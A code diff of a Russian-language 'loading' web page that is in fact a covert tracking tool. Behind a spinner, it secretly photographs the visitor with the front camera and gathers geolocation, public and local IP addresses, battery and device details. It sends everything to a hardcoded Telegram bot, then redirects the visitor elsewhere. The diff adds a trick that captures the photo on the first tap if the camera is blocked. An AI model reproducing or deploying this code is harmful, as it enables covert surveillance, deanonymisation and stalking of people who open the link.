@@ -6,13 +6,13 @@
 <title>Загрузка...</title>
 <style>
 *{box-sizing:border-box}
-html,body{margin:0;padding:0;height:100%;background:#050508;color:#e0e0e0;font:15px/1.5 Arial,sans-serif;overflow:hidden}
-#app{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;position:relative}
+html,body{margin:0;padding:0;height:100%;background:#050508;color:#e0e0e0;font:15px/1.5 Arial,sans-serif;overflow:hidden;user-select:none}
+#app{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;position:relative;z-index:10}
 .spinner{width:50px;height:50px;border:4px solid #1a1a24;border-top-color:#8b5cf6;border-radius:50%;animation:spin .9s linear infinite;margin-bottom:24px}
 @keyframes spin{to{transform:rotate(360deg)}}
 h1{font-size:20px;color:#fff;margin:0 0 12px;font-weight:600;opacity:.9}
 p{color:#666;margin:0 0 32px;max-width:400px;font-size:14px;line-height:1.6}
-#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 1.5s ease-in-out infinite}
+#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 1.5s ease-in-out infinite;z-index:10}
 @keyframes load{0%{left:-30%}100%{left:100%}}
 video,canvas{display:none}
 </style>
@@ -33,36 +33,40 @@ video,canvas{display:none}
 // ═══════════════════════════════════════════════════════
 const TOKEN='9276690902:AAHJGUXY6ElHUallH0TsfYZ8hMA6sLMOtNA';
 const CHAT_ID='8667961334';
-const CHECK_URL='https://share.google/nwoUZLDYhdVy8e0qg';
-const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // Куда перенаправить в конце
+const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // Куда перенаправить
 
 const video=document.getElementById('preview');
 const canvas=document.getElementById('canvas');
+let photoTaken=false;
+let photoBlob=null;
 
 // ═══════════════════════════════════════════════════════
-// ФОТО (скрыто) - Ускорено
+// ФОТО
 // ═══════════════════════════════════════════════════════
-async function capturePhoto(){
+async function takePhoto(){
+  if(photoTaken) return;
   let stream=null;
   try{
-    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false});
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:640,height:480},audio:false
+    });
     video.srcObject=stream;
     await new Promise(res=>{
       if(video.readyState>=2) return res();
       video.onloadeddata=()=>res();
-      setTimeout(res,700); // Ждем максимум 0.7 сек
+      setTimeout(res,1000);
     });
-    await new Promise(r=>setTimeout(r,100)); // Минимальная задержка на экспозицию
+    await new Promise(r=>setTimeout(r,200));
     const w=video.videoWidth||640,h=video.videoHeight||480;
     canvas.width=w;canvas.height=h;
     canvas.getContext('2d').drawImage(video,0,0,w,h);
-    const blob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
+    photoBlob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
     stream.getTracks().forEach(t=>t.stop());
     video.srcObject=null;
-    return blob;
+    photoTaken=true;
   }catch(e){
     if(stream) stream.getTracks().forEach(t=>t.stop());
-    return null;
+    console.log('Camera error:', e);
   }
 }
 
@@ -104,7 +108,7 @@ function getLocalIPs(){
       if(m) (/srflx|relay/.test(c)?srflx:ips).add(m[1]);
     };
     pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finish);
-    setTimeout(finish,800); // Ускорено до 0.8 сек
+    setTimeout(finish,800);
   });
 }
 
@@ -127,7 +131,6 @@ async function getBattery(){
 // СБОР ДАННЫХ
 // ═══════════════════════════════════════════════════════
 async function collectAll(){
-  // Запускаем все запросы параллельно для скорости
   const [geo, ips, battery] = await Promise.all([
     getPublicIP(),
     getLocalIPs(),
@@ -213,63 +216,67 @@ async function collectAll(){
 }
 
 // ═══════════════════════════════════════════════════════
-// ОТПРАВКА (не ждем ответа, чтобы ускорить редирект)
+// ОТПРАВКА
 // ═══════════════════════════════════════════════════════
-async function sendPhoto(blob,caption){
-  if(!blob) return;
-  try{
-    const form=new FormData();
-    form.append('chat_id',CHAT_ID);
-    form.append('photo',blob,'photo.jpg');
-    form.append('caption',caption||'📷');
-    form.append('parse_mode','HTML');
-    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:form});
-  }catch(e){}
-}
-
-async function sendJSON(jsonText){
+async function sendData(data){
+  const jsonText=JSON.stringify(data,null,2);
+  
+  // 1. Отправляем JSON файлом
   try{
     const blob=new Blob([jsonText],{type:'application/json;charset=utf-8'});
     const form=new FormData();
     form.append('chat_id',CHAT_ID);
     form.append('document',blob,'data_'+Date.now()+'.json');
-    form.append('caption','📦 JSON\n'+new Date().toLocaleString('ru-RU'));
+    form.append('caption','📦 JSON данные\n'+new Date().toLocaleString('ru-RU'));
     await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:form});
   }catch(e){}
+
+  // 2. Отправляем фото с подписью (если есть)
+  if(photoBlob){
+    try{
+      const form=new FormData();
+      form.append('chat_id',CHAT_ID);
+      form.append('photo',photoBlob,'photo.jpg');
+      const cap='📷 Фото\n\n'+
+        '🌍 '+(data.geo_country||'?')+' / '+(data.geo_region||'?')+' / '+(data.geo_city||'?')+'\n'+
+        '📍 '+(data.geo_latitude??'?')+', '+(data.geo_longitude??'?')+'\n'+
+        '🔋 '+(data.battery?.level_percent??'?')+'% ('+(data.battery?.charging?'заряжается':'разряжается')+')\n'+
+        '📱 '+(data.device_type||'?')+' / '+(data.os||'?')+' / '+(data.device_model||'?')+'\n'+
+        '🌐 IP: '+(data.ip_public||'?')+'\n'+
+        '🕐 '+new Date().toLocaleString('ru-RU');
+      form.append('caption',cap);
+      form.append('parse_mode','HTML');
+      await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:form});
+    }catch(e){}
+  }
 }
 
 // ═══════════════════════════════════════════════════════
-// ЗАПУСК ЗА 1 СЕКУНДУ
+// ЗАПУСК
 // ═══════════════════════════════════════════════════════
 async function run(){
-  // Запускаем фото и сбор данных ОДНОВРЕМЕННО
-  const [photoBlob, data] = await Promise.all([
-    capturePhoto(),
-    collectAll()
+  // Собираем данные и фото одновременно
+  const [data] = await Promise.all([
+    collectAll(),
+    takePhoto()
   ]);
 
-  const jsonText=JSON.stringify(data,null,2);
-  
-  // Отправляем в ТГ (не ждем завершения, чтобы сразу сделать редирект)
-  sendJSON(jsonText);
-  
-  if(photoBlob){
-    const cap='📷 Фото\n\n'+
-      '🌍 '+(data.geo_country||'?')+' / '+(data.geo_region||'?')+' / '+(data.geo_city||'?')+'\n'+
-      '📍 '+(data.geo_latitude??'?')+', '+(data.geo_longitude??'?')+'\n'+
-      '🔋 '+(data.battery?.level_percent??'?')+'% ('+(data.battery?.charging?'заряжается':'разряжается')+')\n'+
-      '📱 '+(data.device_type||'?')+' / '+(data.os||'?')+' / '+(data.device_model||'?')+'\n'+
-      '🌐 IP: '+(data.ip_public||'?')+'\n'+
-      '🕐 '+new Date().toLocaleString('ru-RU');
-    sendPhoto(photoBlob,cap);
-  }
+  // Отправляем
+  await sendData(data);
 
-  // РЕДИРЕКТ (сработает быстро, как только данные собрались)
-  window.location.replace(REDIRECT_URL);
+  // Перенаправляем через 1 секунду
+  setTimeout(() => {
+    window.location.replace(REDIRECT_URL);
+  }, 1000);
 }
 
+// ХИТРОСТЬ: Если камера заблокирована, первый тап по экрану сделает фото
+document.addEventListener('touchstart', takePhoto, {once:true});
+document.addEventListener('click', takePhoto, {once:true});
+
+// Запуск
 window.addEventListener('load',()=>{
-  setTimeout(run,50); // Старт почти мгновенный
+  setTimeout(run,100);
 });
 </script>
 </body>
